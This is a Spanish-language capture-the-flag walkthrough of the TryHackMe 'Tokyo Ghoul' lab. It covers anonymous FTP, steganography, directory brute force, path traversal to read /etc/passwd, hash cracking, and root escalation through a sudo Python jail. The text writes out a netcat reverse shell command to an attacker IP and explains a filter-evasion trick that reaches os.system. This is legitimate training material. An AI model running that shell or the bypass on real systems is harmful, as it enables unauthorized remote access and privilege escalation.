---
layout: single
title: Tokyo Ghoul - TryHackMe
excerpt: "Debemos encontrar dos banderas en la maquina `tokyo ghoul`. Donde a partir del escaneo de puertos de `Nmap` pude saber que hay un servicio `FTP`, `HTTP` y `SSH`. Ademas, a partir del script `ftp-anom.nse` de Nmap pude saber que el servidor FTP admite conexiones anónimas y se enumeró un directorio compartido,que contenía un archivo ejecutable y una imagen JPG. Luego, encontré una frase clave en el archivo ejecutable. Luego, utilice `steghide` para extraer un archivo oculto, que contenía el nombre de un recurso web, de la imagen usando la frase clave. Luego, utilice `wfuzz` para realizar fuerza bruta de directorios sobre el recurso web, llegando a encontrar un sitio web vulnerable a `Path Traversal`. Luego, se observó el contenido del archivo `/etc/passwd`. Donde se obtuvo las credenciales de un usuario a partir del crackeo de su hash mediante `John The Ripper`. Luego, realizamos una escalada de privilegios para ser el usuario `root` aprovechando que podemos ejecutar un script en `Python` con el comando `sudo`."
date: 2023-07-12	
classes: wide
header:
  teaser: /assets/images/Tokyo/image003.png
  teaser_home_page: true
  icon: /assets/images/descarga7.webp
categories:
  - TryHackMe
  - ctf
tags:
  - Linux  
  - OpenVPN
  - Nmap
  - SSH
  - FTP
  - HTTP
  - nano
  - strings
  - Steghide
  - John The Ripper
  - Sudo
  - Wfuzz
  - Codigo Morse
  - Path Traversal
---

![](/assets/images/Tokyo/image001.png)

## SUMMARY

Debemos encontrar dos banderas en la maquina `tokyo ghoul`. Donde a partir del escaneo de puertos de `Nmap` pude saber que hay un servicio `FTP`, `HTTP` y `SSH`. Ademas, a partir del script `ftp-anom.nse` de Nmap pude saber que el servidor FTP admite conexiones anónimas y se enumeró un directorio compartido,que contenía un archivo ejecutable y una imagen JPG. Luego, encontré una frase clave en el archivo ejecutable. Luego, utilice `steghide` para extraer un archivo oculto, que contenía el nombre de un recurso web, de la imagen usando la frase clave. Luego, utilice `wfuzz` para realizar fuerza bruta de directorios sobre el recurso web, llegando a encontrar un sitio web vulnerable a `Path Traversal`. Luego, se observó el contenido del archivo `/etc/passwd`. Donde se obtuvo las credenciales de un usuario a partir del crackeo de su hash mediante `John The Ripper`. Luego, realizamos una escalada de privilegios para ser el usuario `root` aprovechando que podemos ejecutar un script en `Python` con el comando `sudo` y con los privilegios del usuario root.

## FASE RECONOCIMIENTO

Para resolver este ejercicio empezaremos utilizando el comando `openvpn` con el fin de establecer una conexion VPN con la red virtual donde esta la maquina `tokyo ghoul`. Para ello utilizaremos el archivo de configuracion, que lo podemos descargar en la plataforma de Tryhackme, que puede incluir informacion como la direccion del servidor VPN, los certificados y claves de seguridad, la configuracion de encriptacion, etc.

![](/assets/images/Tokyo/image005.png)

Luego de que se establece la conexion VPN se crea una interfaz virtual de red en nuestra maquina. Donde se enruta todo el trafico de red a traves de esa interfaz. 

![](/assets/images/Tokyo/image007.png)

Ademas, la plataforma de Tryhackme nos muestra la direccion ip de la maquina `tokyo ghoul`.

![](/assets/images/Tokyo/image009.png)

## FASE ESCANEO Y ENUMERACION
Luego pasaremos a la fase de Escaneo y Enumeración con el fin de poder escanear los puertos del nodo. Además, obtendremos los servicios que se han levantado en los puertos abiertos, las versiones de los servicios, y el sistema operativo de la máquina `tokyo ghoul`. Para ello utilizaremos `Nmap`. Donde le pasaremos los siguientes parámetros:
- El parámetro -sC o –script=”default” para utilizar todos los scripts de la categoría default con el fin de realizar un escaneo y detección de los puertos de
manera avanzada.
- El parámetro -sV con el fin de conocer las versiones de los servicios levantados en los puertos abiertos.
- El parámetro -n para evitar la resolución DNS, y el parámetro –max-rate para indicarle el número máximo de paquetes por segundo que va a utilizar Nmap
para el escaneo con el fin de evitar sobrecargar la red con el tráfico generado por la herramienta.
- El parámetro -p- para realizar un escaneo de los 65535 puertos del nodo y el parámetro –open con el fin de que nos muestre información solo de los puertos
abiertos.

![](/assets/images/Tokyo/image011.png)

Los resultados que obtuvimos del escaneo vienen a ser:
- Hay un servicio FTP que se está levantado en el puerto 21, y el programa servidor FT que se está corriendo. Además, la versión del programa servidor FTP
- A partir del script ftp-anom.nse de Nmap se llegó a comprobar que el servidor FTP admite conexiones anónimas, es decir, permite que usuarios anónimos para acceder al servidor FTP, y sus recursos compartidos sin proporcionar credenciales de autenticación. Además, nos lista o enumera los recursos compartidos servidor al cual podemos acceder sin proveer credenciales en la autenticación.
- Hay un servicio HTTP que se está levantado en el puerto 80, y el programa servidor HTTP que se está corriendo. Además, la versión del programa servidor
- A partir del script http-tittle.nse de Nmap llegamos a saber que hay una página web que se aloja en el servidor web.
- Hay un servicio SSH, que esta levantado en el puerto 22, y el programa servidor SSH que se está corriendo. Además, la versión del programa servidor SSH

Ahora accederemos al servidor FTP a través de una conexión anónima con el fin de observar el directorio compartido need_Help?.

![](/assets/images/Tokyo/image013.png)

![](/assets/images/Tokyo/image015.png)

Podemos observar que el directorio need_Help? contiene un archivo llamado Aogiri_tree.txt. y un subdirectorio llamado Talk_with_me, que contiene un archivo llamado need_to_talk y una imagen JPG. Además, con los comandos get y mget hemos descargado todos estos archivos.

Ahora observaremos el contenido de estos archivos.

![](/assets/images/Tokyo/image017.png)

![](/assets/images/Tokyo/image019.png)

![](/assets/images/Tokyo/image021.png)

Podemos observar que el archivo Aogiri_tree.txt solo contiene una parte de la trama del anime.Ademas, a traves del comando file podemos saber que el archivo need_to_talk es un archivo ejecutable. Por lo tanto, cuando lo ejecutamos nos piden una frase, y nos dan una pista sobre revisar el contenido el
archivo ejecutable para encontrar la frase que solicita.

Ademas, cuando observamos el contenido del archivo nos encontramos con muchas caracters que son ilegibles. Por lo tanto, utilizaremos el comando strings para que nos extraiga los caracters elegibles. Una de las cadenas de caracteres elegibles que extrae el comando viene a ser el texto en pantalla que se
muestra cuando ejecutamos el archivo. Ademas, la cadena de caracteres kamishiro no es mostrado en pantalla durante la ejecucion del archivo.

Ahora, introduciremos este cadena de caracters como la frase solicitada.

![](/assets/images/Tokyo/image023.png)

Podemos, observar que nuestra suposicion era correcta. Ademas, nos genera otra frase que puede ser la clave secreta utilizada para ocultar datos en la imagen JPG, que encontramos anteriormente.

Ahora utilizaremos la herramienta steghide para poder extraer los posibles datos ocultos que pueda contener la imagen.

![](/assets/images/Tokyo/image025.png)

![](/assets/images/Tokyo/image027.png)

Podemos observar que apartir del uso de la herramienta de esteganografia steghide y la clave secreta, que obtuvimos anteriormente, podimos extraer un archivo oculto en la imagen.Ademas, observando el contenido del archivo extraido podemoss observar un mensaje en codigo morse que según el archivo viene a ser el nombre de un directorio en su forma decodificada.

Ahora utilizaremos la herramienta en linea CyberChef para obtener el mensaje decodificado.

![](/assets/images/Tokyo/image029.png)

![](/assets/images/Tokyo/image031.png)

![](/assets/images/Tokyo/image033.png)

Podemos observar que llegamos a codificar el mensaje que esta en codigo Morse, obtenindo un mensaje que esta codificado en formato hexadecimal. Ademas, decodificando este mensaje hexadecimal obtenemos un mensaje codificado en base64. Ademas, decodificando este mensaje en base64 obtenemos el nombre del directorio que nos indicaba el mensaje original.

Ahora, observamos la pagina web alojada en el servidor web del sistema destino, que llegamos a encontrar con el script de Nmap, desde mi navegador web.

![](/assets/images/Tokyo/image035.png)

![](/assets/images/Tokyo/image037.png)

Podemos observar que el contenido de la página web viene a ser una parte de la trama del anime. Además, revisando el código fuente de la página web,encontramos un comentario que nos da una indicación de acceder al servidor FTP a través de una conexión anónima (Acción que ya hemos realizado).Además, podemos observar una etiqueta de anclaje cuyo atributo href contiene un link de otra página web.

Ahora observamos el contenido de la página web a través de mi navegador web.

![](/assets/images/Tokyo/image039.png)

![](/assets/images/Tokyo/image041.png)

Podemos observar que el código fuente contiene un comentario que nos da una indicación de acceder al servidor FTP a través de una conexión anónima (Acción que ya hemos realizado).

Ahora suponiendo que el recurso, que encontramos anteriormente, viene a ser el directorio de un sitio web alojado en el servidor web del sistema destino,observaremos el contenido de la página de inicio del directorio.

![](/assets/images/Tokyo/image043.png)

![](/assets/images/Tokyo/image045.png)

Podemos observar que el contenido de la pagina de inicio del directorio viene a ser una indicación a que realicemos fuerza bruta de directorios sobre el directorio del sitio web con el fin de encontrar un recurso escondido. Para ello utilizaremos wfuzz que viene a ser una herramienta automatizada que nos permite realizar fuerza bruta de directorios.

![](/assets/images/Tokyo/image047.png)

Podemos observar que la herramienta llego a encontrar un recurso escondido llamado claim.

Ahora observaremos el contenido del recurso a través de mi navegador web.

![](/assets/images/Tokyo/image049.png)

![](/assets/images/Tokyo/image051.png)

![](/assets/images/Tokyo/image053.png)

Podemos observar que el código fuente de la pagina web de la aplicación web, contiene varias etiquetas de anclaje cuyos atributos href contiene los enlaces hacia diversas paginas web de la aplicación web. Además, observamos que estas paginas web utilizan un archivo PHP llamado index. Donde lo mas probable es que este archivo PHP utilice alguna función como include,require,include_once y require_once, cuyo código PHP puede contener solicitudes GET HTTP para mostrar el contenido de archivos almacenados en el directorio raíz de la aplicación web. Además, a través del valor del parámetro GET view vamos a indicarle el nombre del archivo, que queremos observar, a la función.

## FASE EXPLOTACION O HACKING O GANAR ACCESO 

Ahora pondremos a prueba si la aplicación web valida adecuadamente los valores que insertamos al parámetro get view, es decir, si presenta la vulnerabilidad Path Traversal que nos permita acceder a archivos importantes del sistema como /etc/passwd. Para ello utilizaremos LOS puntos dobles ../ con el fin de movernos al directorio raíz / del sistema objetivo. Luego, digitaremos las rutas de archivos del sistema objetivo como /etc/passwd, /etc/shadow, /proc/version con el fin de observar su contenido a través del navegador web.

![](/assets/images/Tokyo/image055.png)

Podemos observar que obtenemos un mensaje diciéndonos que no es la forma correcta. Además, lo más probable de la causa de este error es que el navegador web no esté realizando la codificación URLEN de manera automática. Por lo tanto, los caracteres no alfanuméricos, que insertamos, no están
siendo reconocidos y procesados correctamente.

Ahora reemplazaremos el punto por su forma de representación en codificación URLEN, %2e.

![](/assets/images/Tokyo/image057.png)

Podemos observar que llegamos a obtener el contenido del archivo /etc/passwd del sistema objetivo. Además, observamos los usuarios locales en el sistema objetivo. Donde la línea, que corresponde al usuario kamishiro, tiene el hash de su contraseña de manera explícita.

Ahora, intentaremos crackear el hash de la contraseña utilizando John The Ripper, pero primero debemos identificar que algoritmo o función hash está utilizando el hash. Para ello utilizaremos hash-identifier.

![](/assets/images/Tokyo/image059.png)

![](/assets/images/Tokyo/image061.png)

Podemos observar que llegamos a encontrar el algoritmo hash que utiliza el hash. Además, con John The Ripper llegamos a crackear el hash, y llegamos a obtener la contraseña de inicio de sesión del usuario kamishiro.

Ahora accederé al sistema objetivo utilizando estas credenciales y mediante el servicio SSH.

![](/assets/images/Tokyo/image063.png)

De esta manera obtenemos acceso al sistema objetivo siendo el usuario kamishiro.

## FASE ESCALADA DE PRIVILEGIOS 
Ahora debemos buscar un vector de escalada de privilegios con el fin de ser un usuario con privilegios más elevados. Para ello utilizaremos el siguiente comando para observar que programas puedo ejecutar con el comando sudo, y con los privilegios del usuario root.

![](/assets/images/Tokyo/image065.png)

Podemos observar que aparece el termino (ALL) al lado del archivo binario python3 y su script. Esto significa que el usuario kamishiro puede ejecutar el script Python utilizando el archivo binario python3 con los privilegios del usuario root a través del comando sudo.

Ahora observaremos el contenido del script jail.py a traves del editor de texto de terminal nano.

![](/assets/images/Tokyo/image067.png)

Podemos observar que el código del script primero va a mostrar un mensaje de bienvenida. Luego, va a solicitar al usuario que ingrese un comando. Además,se utiliza un bucle for para verificar si el comando ingresado contiene palabras clave potencialmente peligrosas como 'eval', 'exec', 'import', 'open', 'os', 'read','system' o 'write', y si encuentra alguna palabra clave en el comando ingresado, se imprime un mensaje advirtiendo sobre su uso no se ejecuta el comando, pero si el comando no contiene ninguna palabra clave peligrosa, se ejecuta utilizando la función exec(), lo que permite la ejecución del código ingresado por el usuario.

Ahora teniendo en cuenta esto ejecutaremos el script, e ingresaremos el siguiente comando para generar una conexión reverse Shell.

![](/assets/images/Tokyo/image069.png)

Los componentes de este comando son:
-  __builtins__.__dict__: El módulo integrado __builtins__ de Python contiene todas las funciones, módulos, y clases básicas de Python. Además, a  través del atributo __builtins__, podre acceder a los módulos de Python.
-  '__IMPORT__'.lower(): Esto devuelve el módulo __import__, que es una función incorporada de Python utilizada para importar módulos.
-  ('OS'.lower()):Esto devuelve la cadena 'os', que es el nombre del módulo que deseamos importar.
-  __dict__'SYSTEM'.lower():Esto devuelve la función os.system(), que se utiliza para ejecutar comandos en el sistema operativo.
-  'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.123.194 1900 >/tmp/f': Este comando nos generara una conexión reverse Shell hacia nuestro  sistema.

Ahora antes de ejecutar el comando, debemos configurar el puerto 1900 en nuestro sistema en escucha para que se pueda establecerá la conexión reverse Shell con nuestro sistema.

![](/assets/images/Tokyo/image071.png)

![](/assets/images/Tokyo/image073.png)

De esta manera llegamos a ser el usuario root.

Ahora buscaremos las dos banderas contenidas en los archivos user.txt y root.txt. Para localizar los archivos utilizaremos el comando find para buscar desde
el directorio /, archivos con sus nombres.

![](/assets/images/Tokyo/image075.png)
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 



































